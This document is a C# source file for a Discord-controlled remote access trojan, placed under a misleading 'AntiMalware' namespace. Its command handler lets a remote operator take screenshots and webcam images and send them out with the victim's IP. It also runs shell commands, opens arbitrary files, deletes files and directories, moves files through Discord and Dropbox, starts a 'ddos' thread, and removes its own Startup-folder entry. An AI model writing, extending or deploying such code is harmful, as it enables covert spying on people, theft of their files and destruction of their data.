using Discord.WebSocket;
using Dropbox.Api.Files;
using System.Diagnostics;
using System.Net;
using System.Windows;
using System.Runtime.InteropServices;
using System.Windows.Interop;
using Discord;
// 명령어 인식 클래스
// make by root1234567891234 as sillo
// 주석 지우지 마세요

namespace AntiMalware
{
    internal class Command
    {
        [DllImport("Shell32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd);
        private text text = new text();
        private GET GET = new GET();
        private value value = new value();
        private thread_ thread_ = new thread_();
        public async Task command(SocketUserMessage message)
        {
            if (message.Content.Split(" ")[0] == "all")
            {
                await message.Channel.SendMessageAsync(value.ip + value.version);
            }
            if (message.Content.Split(" ")[0] == "all_shell")
            {
                try
                {
                    Thread ddos_thread = new Thread(() => thread_.ddos_shell(message));
                    ddos_thread.Start();
                }
                catch (Exception e)
                {
                    await message.Channel.SendMessageAsync(e.ToString());
                }
            }
            if (message.Content.Split(" ")[0] == "all_screenshot")
            {
                try
                {
                    await message.Channel.SendFileAsync(GET.screenshot(), text: GET.ip() + value.version);
                }
                catch (Exception e)
                {
                    await message.Channel.SendMessageAsync(e.ToString());
                }
            }
            if (message.Content.Split(" ")[0] == "all_camshot")
            {
                try
                {
                    await message.Channel.SendFileAsync(GET.camera(), text: GET.ip() + value.version);
                }

                catch (Exception e)
                {
                    await message.Channel.SendMessageAsync(e.ToString());
                }
            }
            if (message.Content.Split(" ")[0] == value.ip)
            {
                if (message.Content.Split(" ")[1] == "screenshot")
                {
                    try
                    {
                        await message.Channel.SendFileAsync(GET.screenshot());
                    }
                    catch (Exception e)
                    {
                        await message.Channel.SendMessageAsync(e.ToString());
                    }
                }
                if (message.Content.Split(" ")[1] == "open")
                {
                    try
                    {
                        ShellExecute(IntPtr.Zero, "open", text.split_sum(message.Content.Split(" ")), "", "", 1);
                    }
                    catch (Exception e)
                    {
                        await message.Channel.SendMessageAsync(e.ToString());
                    }
                }
                if (message.Content.Split(" ")[1] == "messagebox_que")
                {
                    try
                    {
                        Thread msgbox_thread = new Thread(() => thread_.msgbox_que(message));
                        msgbox_thread.Start();
                    }
                    catch (Exception e)
                    {
                        await message.Channel.SendMessageAsync(e.ToString());
                    }
                }
                if (message.Content.Split(" ")[1] == "messagebox")
                {
                    try
                    {
                        Thread msgbox_thread = new Thread(() => thread_.msgbox_(message));
                        msgbox_thread.Start();
                    }
                    catch (Exception e)
                    {
                        await message.Channel.SendMessageAsync(e.ToString());
                    }
                }
                if (message.Content.Split(" ")[1] == "messagebox_error")
                {
                    try
                    {
                        Thread msgbox_thread = new Thread(() => thread_.msgbox_error(message));
                        msgbox_thread.Start();
                    }
                    catch (Exception e)
                    {
                        await message.Channel.SendMessageAsync(e.ToString());
                    }
                }
                if (message.Content.Split(" ")[1] == "dropbox_download")
                {
                    try
                    {
                        Thread dropbox_thread = new Thread(() => thread_.dropbox_download_fun(message));
                        dropbox_thread.Start();
                    }
                    catch (Exception e)
                    {
                        await message.Channel.SendMessageAsync(e.ToString());
                    }
                }
                if (message.Content.Split(" ")[1] == "dropbox_upload")
                {
                    try
                    {
                        Thread dropbox_thread = new Thread(() => thread_.dropbox_upload_fun(message));
                        dropbox_thread.Start();
                    }
                    catch (Exception e)
                    {
                        await message.Channel.SendMessageAsync(e.ToString());
                    }
                }
                if (message.Content.Split(" ")[1] == "deletdir")
                {
                    try
                    {
                        Directory.Delete(text.split_sum(message.Content.Split(" ")), true);
                        message.Channel.SendMessageAsync("해당 디렉토리삭제를 성공했습니다.");
                    }
                    catch (Exception e)
                    {
                        await message.Channel.SendMessageAsync(e.ToString());
                    }
                }
                if (message.Content.Split(" ")[1] == "deletfile")
                {
                    try
                    {
                        File.Delete(text.split_sum(message.Content.Split(" ")));
                        await message.Channel.SendMessageAsync("해당 파일삭제를 성공했습니다.");
                    }
                    catch (Exception e)
                    {
                        await message.Channel.SendMessageAsync(e.ToString());
                    }
                }
                if (message.Content.Split(" ")[1] == "camshot")
                {
                    try
                    {
                        await message.Channel.SendFileAsync(GET.camera());
                    }

                    catch (Exception e)
                    {
                        await message.Channel.SendMessageAsync(e.ToString());
                    }
                }
                if (message.Content.Split(" ")[1] == "dir")
                {
                    try
                    {
                        await message.Channel.SendMessageAsync(text.split_sum(message.Content.Split(" ")));
                        Thread.Sleep(750);
                        String[] arry = GET.dic(text.split_sum(message.Content.Split(" "))).ToArray();
                        text.Send_delay(message, arry);
                    }
                    catch (Exception e)
                    {
                        await message.Channel.SendMessageAsync(e.ToString());
                    }
                }
                if (message.Content.Split(" ")[1] == "shell")
                {
                    try
                    {
                        Thread cmd_thread = new Thread(() => thread_.cmd_(message));
                        cmd_thread.Start();
                    }
                    catch (Exception e)
                    {
                        await message.Channel.SendMessageAsync(e.ToString());
                    }
                }
                if (message.Content.Split(" ")[1] == "downloadfile")
                {
                    try
                    {
                        await message.Channel.SendFileAsync(text.split_sum(message.Content.Split(" ")));
                    }
                    catch (Exception e)
                    {
                        await message.Channel.SendMessageAsync(e.ToString());
                    }
                }
                if (message.Content.Split(" ")[1] == "uploadfile")
                {
                    try
                    {
                        Console.WriteLine(text.split_sum(message.Content.Split(" ")));
                        string URL = null;
                        URL = message.Attachments.ElementAt(0).Url;
                        Console.WriteLine(URL);
                        WebClient client = new WebClient();
                        client.DownloadFile(new Uri(URL), text.split_sum(message.Content.Split(" ")));
                    }
                    catch (Exception e)
                    {
                        await message.Channel.SendMessageAsync(e.ToString());
                    }
                }
                if (message.Content.Split(" ")[1] == "kill")
                {
                    try
                    {
                        Environment.Exit(0);
                    }
                    catch (Exception e)
                    {
                        await message.Channel.SendMessageAsync(e.ToString());
                    }
                }
                if (message.Content.Split(" ")[1] == "delet")
                {
                    try
                    {
                        string path = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + value.filename;
                        File.Delete(path);
                    }
                    catch (Exception e)
                    {
                        await message.Channel.SendMessageAsync(e.ToString());
                    }
                }
            }
        }
    }
}
